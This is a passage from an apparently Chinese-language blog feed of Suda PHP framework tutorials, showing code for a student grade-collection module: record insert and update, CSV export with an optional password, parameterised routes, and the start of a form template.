class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(<span class="keyword">__FILE__</span>), <span class="string">'statistic'</span>);</span><br><span class="line">        $tableId = $request-&gt;get(<span class="string">'table_id'</span>);</span><br><span class="line">        <span class="comment">// 判断是否存在ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($tables[$tableId])) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($request-&gt;hasPost()) &#123;</span><br><span class="line">                <span class="comment">// 显示结果页面</span></span><br><span class="line">                $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'state'</span>);</span><br><span class="line">                <span class="keyword">if</span> ($type = <span class="keyword">$this</span>-&gt;insertData($tableId, $request)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($type == <span class="number">1</span>) &#123;</span><br><span class="line">                        $view-&gt;set(<span class="string">'message'</span>,<span class="string">'写入成功'</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $view-&gt;set(<span class="string">'message'</span>,<span class="string">'数据未更新'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $view-&gt;set(<span class="string">'message'</span>,<span class="string">'写入失败'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $view-&gt;render();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'table'</span>);</span><br><span class="line">                $view-&gt;set(<span class="string">'fields'</span>, $tables[$tableId][<span class="string">'fields'</span>]);</span><br><span class="line">                $view-&gt;set(<span class="string">'name'</span>, $tables[$tableId][<span class="string">'name'</span>]);</span><br><span class="line">                $view-&gt;render();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 显示404界面</span></span><br><span class="line">            hook()-&gt;exec(<span class="string">'system:404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertData</span><span class="params">(string $tableId, Request $request)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $table = <span class="keyword">new</span> \dxkite\statistical\table\StatisticTable;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;post(<span class="string">'name'</span>, <span class="keyword">null</span>) &amp;&amp; $request-&gt;post(<span class="string">'number'</span>, <span class="keyword">null</span>) &amp;&amp; $request-&gt;post(<span class="string">'data'</span>, <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="comment">// 查询条件</span></span><br><span class="line">            $where = [</span><br><span class="line">                <span class="string">'table_id'</span> =&gt; $tableId,</span><br><span class="line">                <span class="string">'student_id'</span> =&gt; $request-&gt;post(<span class="string">'number'</span>)</span><br><span class="line">            ];</span><br><span class="line">            <span class="comment">// 如果存在学号相同，则更新记录</span></span><br><span class="line">            <span class="comment">// 根据ID更新会更快</span></span><br><span class="line">            <span class="keyword">if</span> ($data = $table-&gt;select([<span class="string">'id'</span>],$where)-&gt;fetch()) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($table-&gt;updateByPrimaryKey($data[<span class="string">'id'</span>], [</span><br><span class="line">                    <span class="string">'name'</span> =&gt; $request-&gt;post(<span class="string">'name'</span>),</span><br><span class="line">                    <span class="string">'data'</span> =&gt; $request-&gt;post(<span class="string">'data'</span>)</span><br><span class="line">                ])) &#123;</span><br><span class="line">                    <span class="comment">// 更新成功</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 未跟新</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 插入新记录</span></span><br><span class="line">                $id = $table-&gt;insert([</span><br><span class="line">                    <span class="string">'table_id'</span> =&gt; $tableId,</span><br><span class="line">                    <span class="string">'student_id'</span> =&gt; $request-&gt;post(<span class="string">'number'</span>),</span><br><span class="line">                    <span class="string">'name'</span> =&gt; $request-&gt;post(<span class="string">'name'</span>),</span><br><span class="line">                    <span class="string">'data'</span> =&gt; $request-&gt;post(<span class="string">'data'</span>),</span><br><span class="line">                ]);</span><br><span class="line">                <span class="keyword">if</span> ($id &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，我们查询 table_id 和 student_id ，是否存在，存在则更新，否则插入。</p><h2 id="数据下载"><a href="#数据下载" class="headerlink" title="数据下载"></a>数据下载</h2><p>我们的数据已经储存在数据库中了，现在我们要它可以导出下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DownloadResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(<span class="keyword">__FILE__</span>), <span class="string">'statistic'</span>);</span><br><span class="line">        $tableId = $request-&gt;get(<span class="string">'table_id'</span>);</span><br><span class="line">        <span class="comment">// 判断是否存在ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($tables[$tableId])) &#123;</span><br><span class="line">            $data = <span class="keyword">$this</span>-&gt;exportData($tableId, $tables[$tableId][<span class="string">'fields'</span>]);</span><br><span class="line">            <span class="comment">// 暂存文件</span></span><br><span class="line">            $path = RUNTIME_DIR .<span class="string">'/'</span>. $tableId .<span class="string">'.csv'</span>;</span><br><span class="line">            storage()-&gt;put($path,$data);</span><br><span class="line">            <span class="comment">// 生成文件下载</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file($path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 显示404界面</span></span><br><span class="line">            hook()-&gt;exec(<span class="string">'system:404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span><span class="params">(string $tableId, array $fields)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $table = <span class="keyword">new</span> \dxkite\statistical\table\StatisticTable;</span><br><span class="line">        <span class="comment">// 列出同一个表格</span></span><br><span class="line">        $datas =  $table-&gt;listWhere([<span class="string">'table_id'</span> =&gt; $tableId]);</span><br><span class="line">        <span class="comment">// 生成表头</span></span><br><span class="line">        $csv = [];</span><br><span class="line">        $csv[<span class="number">0</span>] = [ <span class="number">0</span> =&gt;<span class="string">'学号'</span>, <span class="number">1</span> =&gt; <span class="string">'姓名'</span>];</span><br><span class="line">        <span class="comment">// 表头ID</span></span><br><span class="line">        $header = [<span class="number">0</span>,<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $id  =&gt; $value) &#123;</span><br><span class="line">            $csv[<span class="number">0</span>][$id] = $value[<span class="string">'name'</span>];</span><br><span class="line">            $header[] = $id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成数据</span></span><br><span class="line">        <span class="keyword">foreach</span> ($datas <span class="keyword">as</span> $data) &#123;</span><br><span class="line">            $id = count($csv);</span><br><span class="line">            $csv[$id][<span class="number">0</span>]= $data[<span class="string">'student_id'</span>];</span><br><span class="line">            $csv[$id][<span class="number">1</span>]= $data[<span class="string">'name'</span>];</span><br><span class="line">            <span class="keyword">foreach</span> ($data[<span class="string">'data'</span>] <span class="keyword">as</span> $index =&gt; $value) &#123;</span><br><span class="line">                $csv[$id][$index]=$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $text = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($csv <span class="keyword">as</span> $data) &#123;</span><br><span class="line">            $row = [];</span><br><span class="line">            <span class="keyword">foreach</span> ($header <span class="keyword">as</span> $id) &#123;</span><br><span class="line">                $row[] = $data[$id];</span><br><span class="line">            &#125;</span><br><span class="line">            $text .= implode(<span class="string">','</span>, $row) . <span class="string">"\r\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中  <code>exportData</code> 函数是将数据从数据库中取出并生成 <code>csv</code> 格式的数据，<code>file</code> 函数是将文件生成下载。</p><h2 id="添加一下密码认证？"><a href="#添加一下密码认证？" class="headerlink" title="添加一下密码认证？"></a>添加一下密码认证？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DownloadResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(<span class="keyword">__FILE__</span>), <span class="string">'statistic'</span>);</span><br><span class="line">        $tableId = $request-&gt;get(<span class="string">'table_id'</span>);</span><br><span class="line">        <span class="comment">// 判断是否存在ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($tables[$tableId])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($tables[$tableId][<span class="string">'password'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($request-&gt;get(<span class="string">'password'</span>) == $tables[$tableId][<span class="string">'password'</span>]) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;download($tableId, $tables[$tableId][<span class="string">'fields'</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'密码错误'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;download($tableId, $tables[$tableId][<span class="string">'fields'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 显示404界面</span></span><br><span class="line">            hook()-&gt;exec(<span class="string">'system:404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">(string $tableId, array $fields)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;exportData($tableId, $fields);</span><br><span class="line">        <span class="comment">// 暂存文件</span></span><br><span class="line">        $path = RUNTIME_DIR .<span class="string">'/'</span>. $tableId .<span class="string">'.csv'</span>;</span><br><span class="line">        storage()-&gt;put($path, $data);</span><br><span class="line">        <span class="comment">// 生成文件下载</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file($path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span><span class="params">(string $tableId, array $fields)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $table = <span class="keyword">new</span> \dxkite\statistical\table\StatisticTable;</span><br><span class="line">        <span class="comment">// 列出同一个表格</span></span><br><span class="line">        $datas =  $table-&gt;listWhere([<span class="string">'table_id'</span> =&gt; $tableId]);</span><br><span class="line">        <span class="comment">// 生成表头</span></span><br><span class="line">        $csv = [];</span><br><span class="line">        $csv[<span class="number">0</span>] = [ <span class="number">0</span> =&gt;<span class="string">'学号'</span>, <span class="number">1</span> =&gt; <span class="string">'姓名'</span>];</span><br><span class="line">        <span class="comment">// 表头ID</span></span><br><span class="line">        $header = [<span class="number">0</span>,<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $id  =&gt; $value) &#123;</span><br><span class="line">            $csv[<span class="number">0</span>][$id] = $value[<span class="string">'name'</span>];</span><br><span class="line">            $header[] = $id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成数据</span></span><br><span class="line">        <span class="keyword">foreach</span> ($datas <span class="keyword">as</span> $data) &#123;</span><br><span class="line">            $id = count($csv);</span><br><span class="line">            $csv[$id][<span class="number">0</span>]= $data[<span class="string">'student_id'</span>];</span><br><span class="line">            $csv[$id][<span class="number">1</span>]= $data[<span class="string">'name'</span>];</span><br><span class="line">            <span class="keyword">foreach</span> ($data[<span class="string">'data'</span>] <span class="keyword">as</span> $index =&gt; $value) &#123;</span><br><span class="line">                $csv[$id][$index]=$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $text = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($csv <span class="keyword">as</span> $data) &#123;</span><br><span class="line">            $row = [];</span><br><span class="line">            <span class="keyword">foreach</span> ($header <span class="keyword">as</span> $id) &#123;</span><br><span class="line">                $row[] = $data[$id];</span><br><span class="line">            &#125;</span><br><span class="line">            $text .= implode(<span class="string">','</span>, $row) . <span class="string">"\r\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我把生成下载文件的代码变成了一个函数（因为会写两次），然后验证了一下配置文件是否配置了密码，配置了则要输入密码才可以下载。</p><p>配置密码：</p><p><img src="1.png" alt=""></p><p>下载URL：</p><p><code>http://score.dxkite.org/dev.php/table_id_1/download?password=密码</code></p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>整合好代码使其能够完整运行起来</li></ul><hr><p><a href="statistical_18.08.10.mod">完整模块代码下载</a></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 08 成绩统计系统 - 路由参数</title>
      <link href="/2018/08/06/suda-results-statistical-router/"/>
      <url>/2018/08/06/suda-results-statistical-router/</url>
      <content type="html"><![CDATA[<p>上一篇我们讲了一下数据表，本次将一下部分路由以及处理。</p><a id="more"></a><h2 id="带参数的路由"><a href="#带参数的路由" class="headerlink" title="带参数的路由"></a>带参数的路由</h2><p>上一篇我留了几个路由作业，我挖了个坑</p><ul><li>index 页面，显示可以输入的表格数量，提供一个下载链接</li><li>table 页面，显示输入的表格</li><li>download 页面，提供下载表格的功能</li></ul><p>table/download 页面最好都要有一个参数，比如 访问的时候 <code>/table_id/table</code> 是不是更加给力一些？</p><p>在路由中添加参数可以用语法 <code>{name:type=default}</code> 来定义参数，支持类型 string,int,url ,说明如下</p><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>string</td><td>一个字符串，匹配除/之外的所有字符</td></tr><tr><td>url</td><td>匹配后面的所有参数</td></tr><tr><td>int</td><td>匹配数字串</td></tr></tbody></table><h3 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h3><p>按照如上规则，我们的路由配置如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/"</span>,</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"dxkite\\statistical\\response\\IndexResponse"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"table"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/&#123;table_id:string&#125;"</span>,</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"dxkite\\statistical\\response\\TableResponse"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"download"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/&#123;table_id:string&#125;\/download"</span>,</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"dxkite\\statistical\\response\\DownloadResponse"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在 table  和 download 页面中我都插入了参数，这个参数可以通过 get 方式获得。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $request-&gt;get(<span class="string">'table_id'</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png" alt=""></p><h2 id="index-页面"><a href="#index-页面" class="headerlink" title="index 页面"></a>index 页面</h2><p>显示当前可以填写的表格，并显示下载链接，目标页面：</p><p><img src="2.png" alt=""></p><p><strong>提示</strong> 带有参数的URL生成方式</p><p>URL(url_id):<code>/{table}/xx/</code>  则 <code>u(&#39;url_id&#39;,somevalue)</code> ，按照顺序填写即可生成URL <code>/somevalue/xx/</code></p><p>如 table 链接： </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"@u('table', 表单ID )"</span>&gt;</span>填写<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>HTML界面自己写，模板语法参考：<a href="https://github.com/DXkite/suda/blob/master/docs/Template.md" target="_blank" rel="noopener">https://github.com/DXkite/suda/blob/master/docs/Template.md</a></strong></p><h2 id="index-处理"><a href="#index-处理" class="headerlink" title="index 处理"></a>index 处理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'index'</span>);</span><br><span class="line">        <span class="comment">// 加载 resource/config/statistic.json 文件</span></span><br><span class="line"></span><br><span class="line">        $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(<span class="keyword">__FILE__</span>),<span class="string">'statistic'</span>);</span><br><span class="line">        $list = [];</span><br><span class="line">        <span class="comment">// 解析拼凑成可以显示的结构</span></span><br><span class="line">        <span class="keyword">foreach</span> ($tables <span class="keyword">as</span> $id =&gt; $attr) &#123;</span><br><span class="line">            $list[$id][<span class="string">'id'</span>] = $id;</span><br><span class="line">            $list[$id][<span class="string">'name'</span>]= $attr[<span class="string">'name'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 压入到HTML view中显示</span></span><br><span class="line">        $view-&gt;set(<span class="string">'list'</span>,$list);</span><br><span class="line">        $view-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="填写表格显示"><a href="#填写表格显示" class="headerlink" title="填写表格显示"></a>填写表格显示</h2><p>目标页面，能够根据配置文件生成相应的页面：</p><p><img src="3.png" alt=""></p><h3 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;$:name&#125;&#125; - 填写表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123;$:name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span 